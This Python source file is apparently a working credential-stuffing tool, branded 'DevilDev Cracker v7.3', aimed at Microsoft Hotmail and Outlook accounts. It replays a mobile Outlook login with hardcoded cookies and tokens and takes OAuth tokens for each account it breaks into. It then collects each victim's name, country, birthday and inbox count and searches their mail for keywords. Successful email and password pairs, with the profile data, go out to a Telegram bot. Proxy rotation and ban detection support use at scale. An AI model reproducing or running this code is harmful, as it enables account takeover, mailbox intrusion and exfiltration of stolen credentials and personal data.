import json
import queue
import random
import re
import threading
import time
import urllib.parse
from pathlib import Path
import requests


class TelegramNotifier:

  def __init__(self, token: str, chat_id: str):
    self.token = token
    self.chat_id = chat_id
    self.api_url = f"https://api.telegram.org/bot{token}"

  def send_hit(self, email: str, password: str, captures: dict, matches: dict):
    try:
      profil = "\n".join(f"• {k}: {v}" for k, v in captures.items())
      bulunan = "\n".join(
          f"✅ {kw}: {data['total']} mesaj — {data['last_msg'][:50]}"
          for kw, data in matches.items()
      )
      mesaj = (
          f"🔱 <b>HIT BULUNDU (DevilDev v7.3)</b>\n\n"
          f"📧 <b>Email:</b> <code>{email}</code>\n"
          f"🔑 <b>Şifre:</b> <code>{password}</code>\n\n"
          f"👤 <b>Profil:</b>\n{profil}\n\n"
          f"🔎 <b>Eşleşen Keywordler:</b>\n{bulunan}\n\n"
          f"⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n"
          f"<b>🛡️ DevilDev Cracker v7.3</b>"
      )
      requests.post(
          f"{self.api_url}/sendMessage",
          json={
              "chat_id": self.chat_id,
              "text": mesaj,
              "parse_mode": "HTML",
              "disable_web_page_preview": True,
          },
          timeout=15,
      )
    except Exception:
      pass


class LoginError(Exception):
  pass


class HotmailChecker:

  def __init__(
      self, email: str, password: str, keywords: list = None, proxy: str = None
  ):
    self.email = email
    self.password = password
    self.keywords = keywords if keywords else []
    self.session = requests.Session()

    if proxy:
      proxy_dict = {"http": proxy, "https": proxy}
      self.session.proxies.update(proxy_dict)

    self.ua = (
        "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv)"
        " AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0"
        " Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0"
    )
    self.session.headers.update({
        "User-Agent": self.ua,
        "Accept-Language": "en-US,en;q=0.9",
    })

    self.code = None
    self.refresh_token = None
    self.access_token = None
    self.substrate_token = None
    self.cid = None
    self.captures = {}
    self.coid = "3d0f0eea-617a-4b9c-a747-100934dca583"

  @staticmethod
  def url_encode(text: str) -> str:
    return urllib.parse.quote(text, safe="")

  def get_cookie_string(self) -> str:
    return "; ".join(f"{c.name}={c.value}" for c in self.session.cookies)

  def extract_code(self, text: str) -> str | None:
    match = re.search(r"[?&]code=([^&#\s\"']+)", text)
    if match:
      return urllib.parse.unquote(match.group(1))
    match = re.search(r'"code"\s*:\s*"([^"]+)"', text)
    if match:
      return match.group(1)
    return None

  def login(self) -> bool:
    us = self.url_encode(self.email)
    ps = self.url_encode(self.password)

    login_url = (
        "https://login.live.com/ppsecure/post.srf"
        "?client_id=0000000048170EF2"
        "&contextid=E5D8A9B73286B7E0"
        "&opid=EED8E3DBCC1AAA6A"
        "&bk=1726223182"
        "&uaid=3d0f0eea617a4b9ca747100934dca583"
        "&pid=15216"
    )

    payload = (
        "ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=-DmudFdPtArk2f9r5G2PufUpIRX8Q9eTm0uFuxS%21hSx27M79PeFyCVNx8l*VUvBBCZwJL62A9FEyKuXoxgKbI96TjlB*EvImvYFtSQP1wJLfwKYWtRUwse4dkf5WNXBy4f3cLPgvJUS1dNFFN4dQAhcmYSlgRfH5J8LYwg3IxmSUcIY%212SkUUWsssgF35aoj%21gcQGM0O0sAJysZGUcmHQJbJ0hIbBG3yJhkeQLukMukTf"
        "&canary=&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ3w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0"
        "&hpgrequestid=&PPFT=-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a%21RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O%21tGitoYrHZifX5YWtvttGdTH3624e8BFApW%21PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE%21eAr0HCbiX9SUJYKmdpvfqCC%21y6GNCug%211cRYmi%21k%21Tp4blIALTbVOAh9A%24%24"
        "&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
        f"&login={us}&loginfmt={us}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={ps}"
    )

    headers = {
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        ),
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "login.live.com",
        "Origin": "https://login.live.com",
        "Referer": (
            "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2"
            "&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL"
            "&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code"
            "&login_hint=nadz_webbo%40hotmail.com&x-client-SKU=MSAL.xplat.android"
            "&x-client-Ver=1.1.0%2bad8a8025&uaid=3d0f0eea617a4b9ca747100934dca583"
            "&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1"
            "&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYtnkwRi0KYRBFtiOdZWedDcJo1x9nkE77oPupHA89D0sKWIqlJtDjwdE8G83lJBW6B5l1WNYBlZ3nk7XTxORpBxSFUJMD0i62-IiTlh6Eo_n5qerCKhTsdwoLQxSRvgLKdJcTjAEJ-Irl78Q8tBQcLDArONnm7z72MYf4HOzF5Ad9Cm-MIpCwrG_jOBp9IKcq7eZtWTLGBIk9UtPCtt6t6SAA"
            "&jshs=0&haschrome=1&passKeyAuth=1.0%2fpasskey"
            "&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ3w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0"
        ),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "X-Requested-With": "com.microsoft.office.outlook",
    }

    self.session.cookies.set(
        "MSPRequ", "id=N&lt=1726223182&co=1", domain="login.live.com"
    )
    self.session.cookies.set(
        "uaid", "3d0f0eea617a4b9ca747100934dca583", domain="login.live.com"
    )
    self.session.cookies.set(
        "RefreshTokenSso",
        "Dgk7lfaShHcQZcgrBYCkHQ6rOBVO9XNFLG0UAhAxkdv3VSeG!mMx2aqqQMTkrp8KSTESlUReGSb3Ga!BIkVRZHv!QEw85VrPUHcQOwkT5gYS2J*TjQeUULzkFbF1HDRsHYZIIfqG741wN3NfHwr6KXo$",
        domain="login.live.com",
    )
    self.session.cookies.set(
        "MSPOK",
        "$uuid-90478d00-dd39-405a-8731-bd22329637de",
        domain="login.live.com",
    )
    self.session.cookies.set(
        "OParams",
        "11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4!lCPLt5BN9cFkaimWnB1wTV!klMzGgtIdHbgmRPzb4WqATStbDaOgvt6JQ6ceoWkz7q*lyN7B4URaaaUJyG1A4oUMzS!7EStUP250VY3RPJB!YAQgq0ft9H4FvXQEjx!FkN7WskkkMbJZ*wAZYEGRgEoPyigP*vrE5zjQIfJ4VB5NvsuhAYbCS5bNRPxOFO7b2o5!AC2jNOGSJytHxKQQnCUcTBcvx1PAjAi2kuEPWTiOjJOxXidNu33PX5kNTriDyGCz46KlHu7ZnFS3QryeAf0lgEZyanDBiFpBvFZE1kxFXen20cH4GIavuKM!99iqdMI6vee7AQgrrDerhcvoSLfVnii5K7xW1B1NUZxihRGFhHw8oJGm4TV2Krs5ICuvSJz9asEHNwvDBZR37UPJjrfBqHkoDM8!3nQ**PGfGam1Vv3xXpjaCuNUy4LCvUrrrO3cyBYCdKp0J16JvEATRytd!jfu*OwJpLnwOoQ6oRVyqFAC99Dp9elLxcbE2rZnZ1gUblQcmFY3ZcHtyLC7faZt*4SzJEaFZ1FCYIgSjyEajoc4213d1dz7vdfBJwsihLN!Y8QoIp0gFo!DM6ltWkmowBRD1hxr!!M60DG5jz75KOPdvVDqlnvbVXf0LqEMoRwsruk65gEF3Dy1Z!yNS5V6q5PSFQj5SvyG!EWon7Mbn6KsyTGBP9tOLdmFHVlie7IX8lBlQf2*z2PjGlEhUn!V6OM0*GHDtqyPuoJMtBIhBSFG4etMhl4UJvOcnyzWdw0PNhGBt6DUiTlDGmtKJMgkH4KyhI1bUoJ26pGSF0mAlFpqtiSNcSdcz1C*0HLUMTbtNW!6q9JZSgF3Gu!8TOsaqV60kiA3iQfQg9IrEtTt6RXDhgLsHzzYYpJy51cRGIk4u5hbVFNAyTZFUuSBpMWCPXFMqo6ZRbkpgKgl7c!j2kbrtVtUC83paGru7Af4!rS1qMgz4xP9d1W7yZDJCd38FmQgUzMFmO8wH0ISVq9m4XbGnzJDvlkI6PI0H1XJz008Q9I5VjDRgzlHPZ4beD8UeTbbt!*r0sZh5f39oQEkpUWgbL2VVQQEKzAdO0O6360kXJObygeg7gr8GIOYsjq4w7W9BX52ESfBBy0dmsx3FPiHgnkCI9lrp!4G!H0sEuPW38zcDrMLF1GxsfGRZ5cL6cfNSo75QFqqQ4j372o6Cr5XjBXv*8wnrB5iYlbZkkkGtLkdhPvo8Wy9Lxl!jr80Y1n98mGdTZPId",
        domain="login.live.com",
    )
    self.session.cookies.set(
        "MicrosoftApplicationsTelemetryDeviceId",
        "ac497201-f3d3-41a7-883c-c50515eabaca",
        domain="login.live.com",
    )
    self.session.cookies.set(
        "ai_session",
        "fiaZX16SGDUFsD1Xch3TeF|1726223182490|1726223182490",
        domain="login.live.com",
    )
    self.session.cookies.set(
        "MUID", "354ca661609b474d9471b6de17e93df7", domain="login.live.com"
    )
    self.session.cookies.set(
        "fptctx2",
        "taBcrIH61PuCVH7eNCyH0K%252fD9DJ44Cptuv0RyrXgXCtEN7M2YMZXcDGxJBSYuGaBLu%252f9JiKDcHLb%252f8JINIhnqSktvc1WTHmZoNaDBGu0QNkIeXqEXSCok8RtGp9vucSE3bH5AyTgKraZz30bwBlRTs8zdebR61peqnbTMLSFu6Z%252fZI8YhEdhzrq6nSuKh7inDsCtL6VZeyS07TLSEhlzeZHY%252fjvAzMVzeXcFDOYLj9JQT%252fFVpLid%252bKgDYOoV40MX%252f0cn4aUVeWt%252bSo7YLMbJTg5NfzPcPtwlcy%252f8xu9HYDOWFtE6HZ%252b3j%252bSBwN5QxLYZkyNTTaCh7UxRHmNg2bu3qw%253d%253d",
        domain="login.live.com",
    )
    self.session.cookies.set(
        "MSFPC",
        "GUID=23978213118146a292284de1afde68a9&HASH=2397&LV=202409&V=4&LU=1726223190403",
        domain="login.live.com",
    )

    time.sleep(random.uniform(0.2, 0.5))
    resp = self.session.post(
        login_url, data=payload, headers=headers, allow_redirects=True, timeout=30
    )
    text = resp.text
    url = str(resp.url)
    cookies = self.get_cookie_string()

    if "Sign in to your Microsoft account" in text:
      raise LoginError("BAD")
    if ",AC:null,urlFedConvertRename" in text:
      raise LoginError("IP BAN")
    if any(
        k in text
        for k in (
            "account.live.com/recover?mkt",
            "recover?mkt",
            "account.live.com/identity/confirm?mkt",
            "/Abuse?mkt=",
        )
    ):
      raise LoginError("2FA")

    self.code = self.extract_code(url) or self.extract_code(text)

    success = False
    if self.code:
      success = True
    elif "ANON" in cookies:
      success = True
    elif "WLSSC" in cookies:
      success = True
    elif "https://login.live.com/oauth20_desktop.srf" in url:
      success = True
    elif "sSigninName" in text:
      success = True
    elif "access_token" in text or "refresh_token" in text:
      success = True
    elif "window.location" in text and self.extract_code(text):
      success = True
    elif "i0281" not in text and "loginfmt" not in text:
      success = True

    if not success:
      raise LoginError("BAD")

    cid = self.session.cookies.get("MSPCID", "")
    self.cid = cid.upper() if cid else None
    return True

  def exchange_code_for_tokens(self) -> bool:
    if not self.code:
      return False

    url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
    data = (
        "client_info=1&client_id=0000000048170EF2"
        "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
        f"&grant_type=authorization_code&code={self.code}"
        "&scope=offline_access%20openid%20profile%20service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
    )
    headers = {
        "Accept-Encoding": "gzip",
        "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
        "Host": "login.microsoftonline.com",
        "return-client-request-id": "false",
        "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
        "x-client-OS": "32",
        "x-client-SKU": "MSAL.xplat.android",
        "x-client-src-SKU": "MSAL.xplat.android",
        "x-client-Ver": "1.1.0+ad8a8025",
    }

    time.sleep(random.uniform(0.1, 0.3))
    try:
      resp = self.session.post(url, data=data, headers=headers, timeout=30)
      j = resp.json()
      self.refresh_token = j.get("refresh_token")
      self.access_token = j.get("access_token")
      return bool(self.refresh_token and self.access_token)
    except Exception:
      return False

  def refresh_substrate_token(self) -> bool:
    if not self.refresh_token:
      return False

    try:
      self.session.get(
          "https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=9188040d-6c67-4c5b-b112-36a304b66dad",
          headers={
              "Accept-Encoding": "gzip",
              "Connection": "Keep-Alive",
              "Enlightened-Hrd-Client": "1",
              "Host": "odc.officeapps.live.com",
              "User-Agent": (
                  "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)"
              ),
              "X-CorrelationId": "3d0f0eea-617a-4b9c-a747-100934dca583",
              "X-Office-Application": "145",
              "X-Office-Platform": "Android",
              "X-Office-Platform-Version": "32",
              "X-Office-Version": "4.2424.2",
              "X-OneAuth-AppId": "com.microsoft.office.outlook",
              "X-OneAuth-AppName": "OutlookOneAuth",
              "X-OneAuth-Version": "2.5.0",
          },
          timeout=30,
      )
    except Exception:
      pass

    url = "https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token"
    data = (
        "client_info=1&client_id=0000000048170EF2"
        f"&refresh_token={urllib.parse.quote(self.refresh_token, safe='')}"
        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default"
        "&grant_type=refresh_token"
    )
    headers = {
        "Accept-Encoding": "gzip",
        "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "correlation-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
        "Host": "login.microsoftonline.com",
        "return-client-request-id": "false",
        "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
        "x-client-OS": "32",
        "x-client-SKU": "MSAL.xplat.android",
        "x-client-src-SKU": "MSAL.xplat.android",
        "x-client-Ver": "1.1.0+ad8a8025",
    }

    time.sleep(random.uniform(0.1, 0.3))
    try:
      resp = self.session.post(url, data=data, headers=headers, timeout=30)
      j = resp.json()
      self.substrate_token = j.get("access_token")
      return bool(self.substrate_token)
    except Exception:
      return False

  def fetch_profile(self) -> bool:
    if not self.substrate_token or not self.cid:
      return False

    urls = [
        "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
        "https://substrate.office.com/profileb2/v2.0/me/profile",
    ]

    for url in urls:
      headers = {
          "Accept-Encoding": "gzip",
          "Authorization": f"Bearer {self.substrate_token}",
          "Connection": "Keep-Alive",
          "Host": "substrate.office.com",
          "User-Agent": (
              "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)"
          ),
          "X-AnchorMailbox": f"CID:{self.cid}",
          "X-ClientRequestId": "3d0f0eea-617a-4b9c-a747-100934dca583",
      }

      time.sleep(random.uniform(0.1, 0.2))
      try:
        resp = self.session.get(url, headers=headers, timeout=30)
        data = resp.json()

        names = data.get("names", [])
        if names:
          first = names[0].get("firstName", "").strip()
          last = names[0].get("lastName", "").strip()
          display = names[0].get("displayName", "").strip()
          if display:
            self.captures["Name"] = display
          elif first or last:
            self.captures["Name"] = f"{first} {last}".strip()

        accounts = data.get("accounts", [])
        if accounts:
          cc = accounts[0].get("countryCode", "").strip()
          if cc:
            self.captures["Country"] = cc

        anniversaries = data.get("anniversaries", [])
        for ann in anniversaries:
          if str(ann.get("type", "")).lower() == "birthday":
            day = ann.get("day", "")
            month = ann.get("month", "")
            year = ann.get("year", "")
            if day or month or year:
              self.captures["Birthday"] = f"{day}-{month}-{year}"
            break

        if not self.captures.get("Name"):
          name = (
              data.get("displayNameDefault")
              or data.get("displayName")
              or data.get("name", "")
          )
          if name:
            self.captures["Name"] = name
        if not self.captures.get("Country"):
          cc = (
              data.get("countryCode")
              or data.get("country")
              or data.get("location", "")
          )
          if cc:
            self.captures["Country"] = cc
        if not self.captures.get("Birthday"):
          day = data.get("birthDay", "")
          month = data.get("birthMonth", "")
          year = data.get("birthYear", "")
          if day or month or year:
            self.captures["Birthday"] = f"{day}-{month}-{year}"

        if self.captures.get("Name") or self.captures.get("Country"):
          return True

      except Exception:
        pass

    return False

  def get_inbox_count(self) -> int:
    if not self.substrate_token:
      return 0

    url = f"https://outlook.live.com/owa/{self.email}/startupdata.ashx?app=Mini&n=0"
    headers = {
        "Host": "outlook.live.com",
        "content-length": "0",
        "x-owa-sessionid": self.coid,
        "x-req-source": "Mini",
        "authorization": f"Bearer {self.substrate_token}",
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv)"
            " AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0"
            " Chrome/95.0.4638.74 Mobile Safari/537.36"
        ),
        "action": "StartupData",
        "x-owa-correlationid": self.coid,
        "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "origin": "https://outlook.live.com",
        "x-requested-with": "com.microsoft.office.outlook",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://outlook.live.com/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9",
    }

    time.sleep(random.uniform(0.1, 0.3))
    try:
      resp = self.session.post(url, headers=headers, timeout=30)
      text = resp.text
      patterns = [
          r'DisplayName\\":\\"Inbox\\",\\"TotalCount\\":(\\d+)',
          r'DisplayName":"Inbox","TotalCount":(\d+)',
          r'"Inbox".*?"TotalCount":(\d+)',
          r'TotalCount":(\d+).*?"Inbox"',
      ]
      for pat in patterns:
        match = re.search(pat, text)
        if match:
          total = int(match.group(1))
          self.captures["Inbox"] = str(total)
          return total
    except Exception:
      pass
    return 0

  def search_keyword(self, keyword: str) -> dict:
    if not self.substrate_token or not self.cid:
      return {"total": 0, "last_msg": ""}

    url = (
        "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
    )

    payload = {
        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "Egypt Standard Time",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {
                "Or": [
                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                    {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                ]
            },
            "From": 0,
            "Query": {"QueryString": keyword},
            "RefiningQueries": None,
            "Size": 25,
            "Sort": [
                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                {"Field": "Time", "SortDirection": "Desc"},
            ],
            "EnableTopResults": True,
            "TopResultsCount": 3,
        }],
        "AnswerEntityRequests": [{
            "Query": {"QueryString": keyword},
            "EntityTypes": ["Event", "File"],
            "From": 0,
            "Size": 10,
            "EnableAsyncResolution": True,
        }],
        "QueryAlterationOptions": {
            "EnableSuggestion": True,
            "EnableAlteration": True,
            "SupportedRecourseDisplayTypes": [
                "Suggestion",
                "NoResultModification",
                "NoResultFolderRefinerModification",
                "NoRequeryModification",
                "Modification",
            ],
        },
        "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
    }

    headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {self.substrate_token}",
        "X-AnchorMailbox": f"CID:{self.cid}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json",
    }

    time.sleep(random.uniform(0.1, 0.2))
    try:
      resp = self.session.post(url, json=payload, headers=headers, timeout=30)
      data = resp.json()

      total = data.get("Total", 0)
      count = 0
      last_msg = ""
      results = []

      try:
        entity_sets = data.get("EntitySets", [])
        if entity_sets and len(entity_sets) > 0:
          result_sets = entity_sets[0].get("ResultSets", [])
          if result_sets and len(result_sets) > 0:
            results = result_sets[0].get("Results", [])
            count = len(results)
            if results and len(results) > 0:
              last_msg = (
                  results[0].get("ConversationTopic", "")
                  or results[0].get("Preview", "")
                  or results[0].get("Subject", "")
              )
      except Exception:
        pass

      total_count = max(total, count)
      return {"total": total_count, "last_msg": last_msg}
    except Exception:
      return {"total": 0, "last_msg": ""}

  def search_keywords(self) -> dict:
    matches = {}
    for kw in self.keywords:
      if not kw.strip():
        continue
      res = self.search_keyword(kw.strip())
      if res["total"] > 0:
        matches[kw.strip()] = res
    return matches

  def run(self) -> tuple[str, dict, dict]:
    self.login()

    if self.exchange_code_for_tokens():
      self.refresh_substrate_token()
      self.fetch_profile()
      self.get_inbox_count()

      if self.keywords:
        matches = self.search_keywords()
        if matches:
          return "HIT", self.captures, matches
        else:
          return "FREE", self.captures, {}
      else:
        return "FREE", self.captures, {}

    return "BAD", {}, {}


class Stats:

  def __init__(self):
    self.lock = threading.Lock()
    self.total = 0
    self.hits = 0
    self.free = 0
    self.bad = 0
    self.retry = 0
    self.start_time = time.time()

  def add(self, stat_type: str):
    with self.lock:
      self.total += 1
      if stat_type == "hit":
        self.hits += 1
      elif stat_type == "free":
        self.free += 1
      elif stat_type == "bad":
        self.bad += 1
      elif stat_type == "retry":
        self.retry += 1
